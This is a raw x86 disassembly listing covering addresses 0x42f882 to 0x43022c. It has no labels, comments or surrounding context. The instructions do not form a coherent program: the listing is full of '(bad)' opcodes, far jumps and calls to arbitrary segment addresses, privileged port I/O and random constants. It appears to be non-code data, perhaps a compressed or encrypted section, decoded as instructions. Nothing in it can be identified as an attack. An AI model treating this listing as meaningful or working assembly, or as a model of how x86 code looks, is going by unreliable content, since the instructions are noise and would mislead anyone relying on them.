  42f882:	add    DWORD PTR ds:0x58a76243,0x75
  42f889:	outs   dx,DWORD PTR ds:[esi]
  42f88a:	pop    ss
  42f88b:	call   0x1217:0xe0c52930
  42f892:	mov    eax,ds:0x187fa2d8
  42f897:	rol    eax,0xc8
  42f89a:	push   edi
  42f89b:	jmp    0x258b:0xac49f1d0
  42f8a2:	or     WORD PTR [edi-0x5a],sp
  42f8a6:	jno    0x42f88a
  42f8a8:	loop   0x42f91c
  42f8aa:	test   eax,0x11459bb2
  42f8af:	mov    eax,ds:0xed5e4630
  42f8b4:	xor    al,BYTE PTR [ebp+0x67]
  42f8b7:	pop    ds
  42f8b8:	jmp    0x9503:0xcc009a2
  42f8bf:	popa   
  42f8c0:	sti    
  42f8c1:	adc    eax,0x61b4c70e
  42f8c6:	sub    DWORD PTR [ecx+eax*8],ebp
  42f8c9:	jb     0x42f8ec
  42f8cb:	pop    eax
  42f8cc:	or     DWORD PTR [ebx+0x51],0xffffffbf
  42f8d0:	jle    0x42f874
  42f8d2:	lock pop esi
  42f8d4:	jmp    0x52be24c3
  42f8d9:	push   0xfb262243
  42f8de:	xor    DWORD PTR [ebp-0x79],edi
  42f8e1:	cdq    
  42f8e2:	pop    ds
  42f8e3:	mov    al,ds:0x1268f50e
  42f8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f8e9:	fmul   st(4),st
  42f8eb:	push   0x2
  42f8ed:	aam    0x36
  42f8ef:	and    cl,BYTE PTR ds:0x68833d61
  42f8f5:	push   ebx
  42f8f6:	inc    bp
  42f8f8:	cld    
  42f8f9:	mov    bh,0xdd
  42f8fb:	bound  ecx,QWORD PTR [ebx-0x1e55dc42]
  42f901:	jmp    DWORD PTR [ebp+0xf]
  42f904:	and    eax,0x7152504a
  42f909:	ja     0x42f8cd
  42f90b:	and    al,0xb7
  42f90d:	(bad)  
  42f90e:	mov    esp,0x6
	...
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f991
  42f981:	dec    eax
  42f982:	enter  0x7844,0xfd
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	aaa    
  42f98d:	pop    ebx
  42f98e:	(bad)  
  42f98f:	dec    esi
  42f990:	int    0xcf
  42f992:	mov    esp,ebp
  42f994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f995:	sbb    DWORD PTR [ebp+0x2bfe5460],ecx
  42f99b:	cmp    DWORD PTR [ebp-0x1db946a1],ecx
  42f9a1:	mov    al,0xa7
  42f9a3:	push   0x51afc44e
  42f9a8:	cwde   
  42f9a9:	cmp    cl,al
  42f9ab:	je     0x42fa0a
  42f9ad:	mov    edx,0xd0afde40
  42f9b2:	(bad)  
  42f9b3:	aam    0x84
  42f9b5:	mov    bh,BYTE PTR [edi+0x6f683478]
  42f9bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9bc:	and    BYTE PTR ds:0x9a8aec26,dl
  42f9c2:	jl     0x42f955
  42f9c4:	sbb    al,0x77
  42f9c6:	call   0x18a1:0x316ed553
  42f9cd:	out    0xce,al
  42f9cf:	out    dx,eax
  42f9d0:	ret    0xe707
  42f9d3:	(bad)  
  42f9d5:	retf   0x62c4
  42f9d8:	icebp  
  42f9d9:	and    esi,DWORD PTR cs:[esi+0x3fdf5f2]
  42f9e0:	mov    bh,0xa6
  42f9e2:	out    0x8b,al
  42f9e4:	leave  
  42f9e5:	ror    BYTE PTR [esi+ebp*8],0xe4
  42f9e9:	jno    0x42f9bb
  42f9eb:	xchg   edi,eax
  42f9ec:	mov    edi,DWORD PTR [esi]
  42f9ee:	rol    BYTE PTR [esi],1
  42f9f0:	mov    edx,0xf0df7f14
  42f9f5:	sub    eax,0xd2cc854
  42f9fa:	push   ebp
  42f9fb:	loope  0x42f9e4
  42f9fd:	jo     0x42fa61
  42f9ff:	aad    0xfd
  42fa01:	int3   
  42fa02:	jle    0x42fa03
  42fa04:	add    esp,ecx
  42fa06:	sub    BYTE PTR [esi+eiz*4-0x5cb386fa],0x97
  42fa0e:	add    eax,0x4ae0c11f
  42fa13:	shl    BYTE PTR [ebx+0x58891fef],cl
  42fa19:	push   ebx
  42fa1a:	popa   
  42fa1b:	les    esp,FWORD PTR [esi]
  42fa1d:	adc    eax,DWORD PTR [edx+0x2b]
  42fa20:	out    dx,eax
  42fa21:	xor    cl,BYTE PTR [edx]
  42fa23:	mov    ds:0xdc155312,al
  42fa28:	jmp    0xe86a:0xa6283b6
  42fa2f:	gs inc esp
  42fa31:	leave  
  42fa32:	push   edi
  42fa33:	add    ebp,ebx
  42fa35:	in     al,dx
  42fa36:	xchg   DWORD PTR [eax],eax
  42fa38:	cmp    al,ch
  42fa3a:	add    eax,0xea85c4b7
  42fa3f:	push   edx
  42fa40:	mov    bh,0xa
  42fa42:	push   0xfffffff5
  42fa44:	ss test dh,0x13
  42fa48:	test   al,0x32
  42fa4a:	ret    0x8100
  42fa4d:	inc    ecx
  42fa4e:	push   edx
  42fa4f:	mov    ds:0x5127187b,eax
  42fa54:	sub    BYTE PTR [ecx+0x18e234e7],0xb4
  42fa5b:	pop    eax
  42fa5c:	sar    ah,cl
  42fa5e:	add    edx,DWORD PTR [esi]
  42fa60:	inc    eax
  42fa61:	xor    BYTE PTR [ebp-0x13],bl
  42fa64:	cmp    al,BYTE PTR [edi-0x41]
  42fa67:	push   0x69
  42fa69:	sbb    ch,bl
  42fa6b:	in     eax,dx
  42fa6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa6d:	mov    ch,0xe8
  42fa6f:	mov    WORD PTR [edx+ecx*4+0x5900483b],fs
  42fa76:	inc    edx
  42fa77:	mov    ds:0xd5392cb0,al
  42fa7c:	push   0x48
  42fa7e:	jmp    0x42fa02
  42fa80:	xor    ah,cl
  42fa82:	aaa    
  42fa83:	cdq    
  42fa84:	sbb    bh,ah
  42fa86:	mov    ah,0x5
  42fa88:	inc    ecx
  42fa89:	cmc    
  42fa8a:	test   al,0xe4
  42fa8c:	mov    ds:0x738d40,eax
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	jle    0x42fb36
  42fb02:	cld    
  42fb03:	loop   0x42fb81
  42fb05:	inc    BYTE PTR [ecx]
  42fb07:	add    BYTE PTR [ecx+eax*1],al
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	add    cl,ch
  42fb0e:	ja     0x42fb86
  42fb10:	je     0x42fabd
  42fb12:	stos   BYTE PTR es:[edi],al
  42fb13:	aad    0xc5
  42fb15:	add    dl,BYTE PTR [edx+0x492b89b5]
  42fb1b:	or     BYTE PTR [eax+eiz*2],bh
  42fb1e:	mov    gs,WORD PTR [ebp+0x584e9d9a]
  42fb24:	or     ebx,DWORD PTR [edx+ecx*4]
  42fb27:	jo     0x42fb3f
  42fb29:	cmp    eax,0xcdb71f5f
  42fb2e:	mov    esp,edx
  42fb30:	stos   DWORD PTR es:[edi],eax
  42fb31:	aad    0x67
  42fb33:	popa   
  42fb34:	and    edi,esi
  42fb36:	push   es
  42fb37:	sub    al,0x9d
  42fb39:	sub    DWORD PTR [edx+0x73],eax
  42fb3c:	lea    ecx,[ebx+edx*2]
  42fb3f:	fdiv   QWORD PTR [ebx+0x8]
  42fb42:	xchg   esi,eax
  42fb43:	pop    ss
  42fb44:	inc    edi
  42fb45:	xchg   ecx,eax
  42fb46:	mov    al,0x8f
  42fb48:	fisubr DWORD PTR [ecx+0xf]
  42fb4b:	add    dh,cl
  42fb4d:	sub    ecx,DWORD PTR [edi+0x21dd5437]
  42fb53:	retf   0xb45e
  42fb56:	test   eax,0x5a3e1db9
  42fb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb5c:	lock jmp 0x42fb61
  42fb5f:	pusha  
  42fb60:	inc    esp
  42fb61:	jg     0x42faff
  42fb63:	pop    edi
  42fb64:	mov    dl,0x4a
  42fb66:	lods   eax,DWORD PTR ds:[esi]
  42fb67:	cli    
  42fb68:	mov    dl,0xf0
  42fb6a:	rcr    DWORD PTR [eax+edi*1],1
  42fb6d:	std    
  42fb6e:	pop    ebx
  42fb6f:	mul    DWORD PTR [ecx-0x1e91fa01]
  42fb75:	jne    0x42fb3c
  42fb77:	jp     0x42fb93
  42fb79:	ds into 
  42fb7b:	mov    cl,0x1c
  42fb7d:	inc    eax
  42fb7e:	xchg   ebx,eax
  42fb7f:	add    BYTE PTR [ebx+0x44],ch
  42fb82:	lods   eax,DWORD PTR ds:[esi]
  42fb83:	sbb    dl,0xc7
  42fb86:	aad    0x9c
  42fb88:	(bad)  
  42fb89:	sub    BYTE PTR [esp+edx*1-0xa],bl
  42fb8d:	test   al,0x3e
  42fb8f:	(bad)  
  42fb90:	retf   
  42fb91:	cmp    esp,edx
  42fb93:	cmp    eax,0xe8d3441a
  42fb98:	nop
  42fb99:	(bad)  
  42fb9a:	cmp    al,0x5f
  42fb9c:	xchg   bh,bh
  42fb9e:	pop    esi
  42fb9f:	ret    0x7f0b
  42fba2:	adc    al,BYTE PTR [ebx]
  42fba4:	mov    esp,0xccf45d73
  42fba9:	cmp    DWORD PTR [eax-0x60],0x58
  42fbad:	sbb    DWORD PTR [edx+0x661e8019],ebx
  42fbb3:	inc    edx
  42fbb4:	inc    esi
  42fbb5:	mov    eax,ds:0x76cc90c4
  42fbba:	int3   
  42fbbb:	pusha  
  42fbbc:	sub    dl,BYTE PTR [ecx-0x723d5962]
  42fbc2:	or     DWORD PTR [ebp+0xc961ab4],eax
  42fbc8:	(bad)  
  42fbca:	cli    
  42fbcb:	or     al,0xeb
  42fbcd:	push   esi
  42fbce:	outs   dx,DWORD PTR ds:[esi]
  42fbcf:	mov    DWORD PTR [ebx+0x14bcf03a],ebx
  42fbd5:	aad    0xc8
  42fbd7:	jp     0x42fb9a
  42fbd9:	repz mov ecx,0x4334c34d
  42fbdf:	cmp    DWORD PTR [ebp+0x35],edi
  42fbe2:	fimul  WORD PTR [esi]
  42fbe4:	mov    ebp,0xd1009d4f
  42fbe9:	icebp  
  42fbea:	(bad)  
  42fbeb:	imul   edx,DWORD PTR es:[eax],0x72
  42fbef:	push   ebp
  42fbf0:	in     eax,dx
  42fbf1:	ins    BYTE PTR es:[edi],dx
  42fbf2:	lock (bad) 
  42fbf4:	sbb    edi,DWORD PTR [esi+0x8]
  42fbf7:	sbb    DWORD PTR [edi],edi
  42fbf9:	cmpxchg BYTE PTR [ebx],ch
  42fbfc:	stc    
  42fbfd:	and    BYTE PTR [eax+0x7e4a7ead],al
  42fc03:	bound  edx,QWORD PTR ds:0xb7616cec
  42fc09:	les    edi,FWORD PTR [ebx]
  42fc0b:	rol    DWORD PTR [eax],0x6c
  42fc0e:	sahf   
  42fc0f:	aad    0x0
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0xfef4:0x2036325e
  42fc82:	mov    dl,0x5c
  42fc84:	cmp    bh,0x1
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	mov    ebp,0x68a0c74b
  42fc91:	stc    
  42fc92:	ins    BYTE PTR es:[edi],dx
  42fc93:	sbb    eax,0x572f18ec
  42fc98:	jmp    FWORD PTR [esi-0x24963d2e]
  42fc9e:	xchg   DWORD PTR ds:0x8dfac34b,eax
  42fca4:	fs jb  0x42fd10
  42fca7:	sbb    BYTE PTR [ebx+0x2d],al
  42fcaa:	xor    al,0x76
  42fcac:	add    dl,BYTE PTR [edi-0xff74708]
  42fcb2:	js     0x42fcfc
  42fcb4:	retf   0x6130
  42fcb7:	inc    ecx
  42fcb8:	lahf   
  42fcb9:	(bad)  
  42fcba:	pushf  
  42fcbb:	loop   0x42fd30
  42fcbd:	fnsave ds:0xa645e5a5
  42fcc3:	repz pop ebx
  42fcc5:	add    DWORD PTR [edi+0x23993b41],0x34dd590b
  42fccf:	mov    WORD PTR [eax+0x543891f3],ds
  42fcd5:	mov    BYTE PTR [ebp+ebx*1+0x16945a4b],ch
  42fcdc:	loope  0x42fcf1
  42fcde:	scas   eax,DWORD PTR es:[edi]
  42fcdf:	jl     0x42fc98
  42fce1:	sub    eax,0xed955c53
  42fce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fce7:	loop   0x42fc81
  42fce9:	sub    edi,DWORD PTR [edx+0x1c6a028b]
  42fcef:	gs xchg ebx,eax
  42fcf1:	mov    bh,BYTE PTR [edx-0x40]
  42fcf4:	leave  
  42fcf5:	pop    eax
  42fcf6:	(bad)  
  42fcf7:	arpl   WORD PTR [edx+esi*4-0x6f021066],bp
  42fcfe:	fldcw  WORD PTR [esi+ebp*1]
  42fd01:	pop    esi
  42fd02:	xchg   esi,eax
  42fd03:	pop    eax
  42fd04:	add    esp,esp
  42fd06:	mov    ds:0xccb36010,al
  42fd0b:	fadd   DWORD PTR [ebx+eax*1-0x44]
  42fd0f:	push   cs
  42fd10:	je     0x42fd41
  42fd12:	pop    esp
  42fd13:	cmp    ch,BYTE PTR [ecx-0x37]
  42fd16:	xchg   ebp,eax
  42fd17:	push   esi
  42fd18:	adc    eax,0x205965d4
  42fd1d:	xchg   esi,eax
  42fd1e:	lahf   
  42fd1f:	les    ebx,FWORD PTR fs:[ecx]
  42fd22:	and    al,0x81
  42fd24:	lods   al,BYTE PTR ds:[esi]
  42fd25:	mov    dl,BYTE PTR [ebx]
  42fd27:	cmc    
  42fd28:	jne    0x42fd82
  42fd2a:	sbb    ah,BYTE PTR [ecx+0x5289aa49]
  42fd30:	push   ebp
  42fd31:	stos   DWORD PTR es:[edi],eax
  42fd32:	or     eax,0x6ad9c484
  42fd37:	in     eax,dx
  42fd38:	cmp    edx,esi
  42fd3a:	popf   
  42fd3b:	sti    
  42fd3c:	xlat   BYTE PTR ds:[ebx]
  42fd3d:	cdq    
  42fd3e:	sbb    ch,BYTE PTR [edi+0x5e]
  42fd41:	jnp    0x42fd32
  42fd43:	mov    DWORD PTR [ecx],edx
  42fd45:	sbb    DWORD PTR ds:0x8eba4ae0,edx
  42fd4b:	mov    al,ds:0x2cb849a8
  42fd50:	jecxz  0x42fd60
  42fd52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd53:	adc    al,0x59
  42fd55:	mov    BYTE PTR [eax],cl
  42fd57:	mov    cl,0x20
  42fd59:	inc    ebx
  42fd5a:	imul   edx,DWORD PTR fs:[ebp-0x5b055256],0x77
  42fd62:	jle    0x42fd5d
  42fd64:	sub    al,0x7e
  42fd66:	test   al,0x7a
  42fd68:	les    eax,FWORD PTR [edi+0xc94316d]
  42fd6e:	add    esi,DWORD PTR [eax+edx*4-0xc]
  42fd72:	loope  0x42fde3
  42fd74:	adc    BYTE PTR [ecx+ecx*1+0x62],dl
  42fd78:	jae    0x42fd95
  42fd7a:	inc    ebp
  42fd7b:	jle    0x42fddd
  42fd7d:	(bad)  
  42fd7e:	push   ecx
  42fd7f:	mov    bl,0xf
  42fd81:	sbb    ah,BYTE PTR [eax+0x5]
  42fd84:	in     al,0xf9
  42fd86:	xchg   edx,eax
  42fd87:	inc    ebp
  42fd88:	scas   eax,DWORD PTR es:[edi]
  42fd89:	mov    ebx,0xcc0e5080
  42fd8e:	test   eax,0x16
	...
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz dec ebp
  42fe01:	fsub   QWORD PTR [eax]
  42fe03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe04:	test   BYTE PTR [eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	rcr    DWORD PTR [edx],0x15
  42fe0f:	mul    ecx
  42fe11:	sub    eax,0x58a48fa6
  42fe16:	dec    ecx
  42fe17:	cmp    bh,dh
  42fe19:	nop
  42fe1a:	mov    bh,bh
  42fe1c:	std    
  42fe1d:	push   edi
  42fe1e:	pop    edi
  42fe1f:	dec    ebp
  42fe20:	push   ebp
  42fe21:	(bad)  
  42fe22:	rcr    BYTE PTR [ebx-0x21c644bd],0xd
  42fe29:	add    bl,ch
  42fe2b:	pxor   mm4,QWORD PTR [ebx+0x40]
  42fe2f:	inc    ebx
  42fe30:	imul   ebp,DWORD PTR [ebx],0xf7546a1f
  42fe36:	dec    ebx
  42fe37:	pop    eax
  42fe38:	xchg   ebx,eax
  42fe39:	push   cs
  42fe3a:	dec    eax
  42fe3b:	fnstenv [esp+edi*2+0x22]
  42fe3f:	in     al,dx
  42fe40:	xchg   ebp,eax
  42fe41:	pop    edx
  42fe42:	nop
  42fe43:	retf   
  42fe44:	pop    ecx
  42fe45:	(bad)  
  42fe46:	fisttp WORD PTR [ebx+0x32102c8b]
  42fe4c:	popa   
  42fe4d:	mov    dl,0x24
  42fe4f:	in     eax,dx
  42fe50:	into   
  42fe51:	loopne 0x42fe78
  42fe53:	pop    edx
  42fe54:	cwde   
  42fe55:	imul   BYTE PTR es:[ecx]
  42fe58:	aad    0xe7
  42fe5a:	pop    ebx
  42fe5b:	lahf   
  42fe5c:	xchg   esi,eax
  42fe5d:	push   0xffffffdf
  42fe5f:	push   es
  42fe60:	push   edi
  42fe61:	pop    es
  42fe62:	push   ebx
  42fe63:	loop   0x42fe8d
  42fe65:	pop    eax
  42fe66:	sbb    ebx,0xffffffb2
  42fe69:	mov    bh,0x44
  42fe6b:	arpl   WORD PTR [edi+ebp*8],bp
  42fe6e:	cld    
  42fe6f:	scas   al,BYTE PTR es:[edi]
  42fe70:	jge    0x42fe01
  42fe72:	lods   al,BYTE PTR ds:[esi]
  42fe73:	xchg   ecx,eax
  42fe74:	sbb    edx,DWORD PTR [ebx+0x3494cbe2]
  42fe7a:	dec    eax
  42fe7b:	xor    cl,ah
  42fe7d:	sahf   
  42fe7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe7f:	out    dx,al
  42fe80:	mov    esi,0x8fa30499
  42fe85:	outs   dx,DWORD PTR ds:[esi]
  42fe86:	stos   BYTE PTR es:[edi],al
  42fe87:	push   esp
  42fe88:	nop
  42fe89:	in     eax,0x68
  42fe8b:	xor    ch,bh
  42fe8d:	stc    
  42fe8e:	xor    al,0x6d
  42fe90:	mov    al,0xdc
  42fe92:	xchg   edi,eax
  42fe93:	in     al,dx
  42fe94:	push   ecx
  42fe95:	mov    edx,0x85b870c
  42fe9a:	dec    ebp
  42fe9b:	sub    al,0x8
  42fe9d:	sbb    dl,BYTE PTR [ebp-0x1ca97395]
  42fea3:	mov    esi,0xfb0f5b4f
  42fea8:	pop    edx
  42fea9:	shl    DWORD PTR ds:0x62858e11,0x29
  42feb0:	lods   eax,DWORD PTR ds:[esi]
  42feb1:	in     al,dx
  42feb2:	sbb    BYTE PTR [esi],dh
  42feb4:	push   ebx
  42feb5:	dec    esp
  42feb6:	ss call 0xf56433a3
  42febc:	(bad)  
  42febd:	lahf   
  42febe:	enter  0xabca,0x99
  42fec2:	ds mov esp,0x94fe83ae
  42fec8:	jns    0x42ff32
  42feca:	sar    DWORD PTR [esi+0x6f731e59],1
  42fed0:	sahf   
  42fed1:	scas   al,BYTE PTR es:[edi]
  42fed2:	mov    bh,0x4c
  42fed4:	pusha  
  42fed5:	jb     0x42fe87
  42fed7:	push   eax
  42fed8:	xchg   edi,eax
  42fed9:	fsubr  DWORD PTR [esi-0x21dfc835]
  42fedf:	stos   BYTE PTR es:[edi],al
  42fee0:	push   ebx
  42fee1:	jle    0x42feb8
  42fee3:	push   edi
  42fee4:	or     BYTE PTR [edi-0x6],bh
  42fee7:	retf   0xf082
  42feea:	call   0x99344e53
  42feef:	add    al,0xc9
  42fef1:	xchg   ebx,eax
  42fef2:	fidiv  DWORD PTR [edi]
  42fef4:	hlt    
  42fef5:	mov    ds:0xe89d490e,eax
  42fefa:	(bad)  
  42fefb:	lods   eax,DWORD PTR ds:[esi]
  42fefc:	fcomp  DWORD PTR ds:0x2bbfab9e
  42ff02:	outs   dx,DWORD PTR ds:[esi]
  42ff03:	sub    ah,dl
  42ff05:	data16 mov dl,0xed
  42ff08:	sub    eax,0xab24f30c
  42ff0d:	fcomip st,st(7)
  42ff0f:	mov    dh,0x0
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [esi+eax*1-0x25],0x7b
  42ff83:	test   BYTE PTR [eax+0x4000201],0x1
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	loope  0x42ff37
  42ff8e:	sti    
  42ff8f:	mov    al,ds:0x84a901cc
  42ff94:	call   0x3ffb:0x771e1187
  42ff9b:	and    al,BYTE PTR [edx-0x34920336]
  42ffa1:	loop   0x42ffe5
  42ffa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ffa4:	sahf   
  42ffa5:	enter  0xe7f0,0x76
  42ffa9:	icebp  
  42ffaa:	imul   ebp,DWORD PTR [esi],0xcd534a9
  42ffb0:	mov    al,ds:0x7cebcc8a
  42ffb5:	cmp    eax,0xa5dd73b6
  42ffba:	dec    eax
  42ffbb:	add    esi,ecx
  42ffbd:	scas   eax,DWORD PTR es:[edi]
  42ffbe:	cmp    eax,0x6f698dd2
  42ffc3:	ror    DWORD PTR [ecx-0x4c2cf6a8],0x24
  42ffca:	xchg   DWORD PTR [edx-0x6cef35d8],eax
  42ffd0:	idiv   DWORD PTR [edx]
  42ffd2:	imul   BYTE PTR [edi+0x24a8980b]
  42ffd8:	xchg   ebx,eax
  42ffd9:	inc    edx
  42ffda:	jb     0x42ff77
  42ffdc:	lods   eax,DWORD PTR ds:[esi]
  42ffdd:	aaa    
  42ffde:	into   
  42ffdf:	xchg   edi,eax
  42ffe0:	in     al,dx
  42ffe1:	fild   WORD PTR [esi-0x56]
  42ffe4:	repz xchg edx,eax
  42ffe6:	xor    eax,0xe4b54ca6
  42ffeb:	fiadd  DWORD PTR [ebx]
  42ffed:	pop    esp
  42ffee:	sub    cl,BYTE PTR [edi]
  42fff0:	mov    DWORD PTR [ecx-0x62],eax
  42fff3:	inc    esp
  42fff4:	mov    ah,0x5c
  42fff6:	arpl   WORD PTR [eax],di
  42fff8:	sub    al,0x82
  42fffa:	sub    BYTE PTR [ebx+0x51b7227e],bh
  430000:	adc    ecx,ebp
  430002:	shr    ebp,cl
  430004:	sbb    al,ah
  430006:	sahf   
  430007:	or     ebx,DWORD PTR [eax]
  430009:	imul   DWORD PTR [edi-0x794c8410]
  43000f:	retf   0x5545
  430012:	adc    ah,dh
  430014:	je     0x42ffd3
  430016:	mov    ds:0x4cd3c6fa,al
  43001b:	and    cl,BYTE PTR [esi]
  43001d:	inc    ecx
  43001e:	into   
  43001f:	repnz mov ch,0xa4
  430022:	fcmovu st,st(5)
  430024:	je     0x430026
  430026:	jmp    0x21f0ad90
  43002b:	mov    DWORD PTR [eax],esp
  43002d:	inc    esi
  43002e:	push   0xe6e732fe
  430033:	jecxz  0x42ffd8
  430035:	mov    esi,0x40059cef
  43003a:	mov    cs,WORD PTR [esi+0xe]
  43003d:	fs loope 0x4300ba
  430040:	(bad)  
  430042:	fst    DWORD PTR [ebx-0x4a]
  430045:	mov    DWORD PTR [edx+0x6102370e],edi
  43004b:	mov    ch,0x35
  43004d:	add    cl,ch
  43004f:	out    dx,eax
  430050:	pop    esi
  430051:	ror    ah,cl
  430053:	mov    BYTE PTR [eax],bl
  430055:	and    al,0x27
  430057:	repz in al,0x13
  43005a:	lahf   
  43005b:	test   DWORD PTR [edx],eax
  43005d:	mov    eax,0xe912a802
  430062:	sbb    edx,DWORD PTR [ecx+edi*4+0x77]
  430066:	push   es
  430067:	mov    edx,0xe2562b62
  43006c:	call   0xe6cdcb84
  430071:	adc    al,BYTE PTR [ebp-0x358f36ab]
  430077:	rol    BYTE PTR [ebp-0x22],0x85
  43007b:	and    cl,0xc1
  43007e:	or     BYTE PTR [esi],bl
  430080:	xchg   ecx,eax
  430081:	shr    BYTE PTR [edi-0x3909f3a5],0xb8
  430088:	or     BYTE PTR [ebp+0x41],ch
  43008b:	and    eax,0x71709c15
	...
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x9b
  430101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430102:	rcr    BYTE PTR [ecx+0x2028c],1
  430108:	add    BYTE PTR fs:[eax],al
  43010b:	add    al,ch
  43010d:	dec    esi
  43010e:	mov    esi,0x59211f6d
  430113:	aas    
  430114:	mov    eax,ds:0xc4be5303
  430119:	mov    esi,0x40feea97
  43011e:	cmc    
  43011f:	fcom   DWORD PTR [ebx]
  430121:	fs adc esp,ecx
  430124:	out    dx,al
  430125:	popa   
  430126:	and    BYTE PTR [esi-0x6b],0x54
  43012a:	lods   al,BYTE PTR ds:[esi]
  43012b:	cwde   
  43012c:	mov    esi,0xab9390ad
  430131:	push   esi
  430132:	dec    BYTE PTR [edx+0x1ca4b02d]
  430138:	xchg   edx,eax
  430139:	sahf   
  43013a:	pop    ecx
  43013b:	adc    al,0xf
  43013d:	rcr    BYTE PTR [esi+0x62],0xf7
  430141:	mov    dl,0xb8
  430143:	push   cs
  430144:	pop    edi
  430145:	and    DWORD PTR [eax],edx
  430147:	jg     0x430126
  430149:	outs   dx,DWORD PTR ds:[esi]
  43014a:	retf   0x1964
  43014d:	mov    bl,0x89
  43014f:	clc    
  430150:	cmp    ebp,DWORD PTR [edx+0x78]
  430153:	lods   al,BYTE PTR ds:[esi]
  430154:	pop    ss
  430155:	adc    DWORD PTR [edx],0x42
  430158:	repnz fisubr WORD PTR [edi+0x8]
  43015c:	or     DWORD PTR [edx-0x7e],esp
  43015f:	dec    edi
  430160:	mov    eax,ds:0xa65c2ab8
  430165:	test   bh,bl
  430167:	dec    ecx
  430168:	in     al,0x8d
  43016a:	stos   BYTE PTR es:[edi],al
  43016b:	repz jp 0x4300fc
  43016e:	push   cs
  43016f:	sldt   WORD PTR [eax]
  430172:	add    BYTE PTR [eax],al
  430174:	dec    ebp
  430175:	push   ebp
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
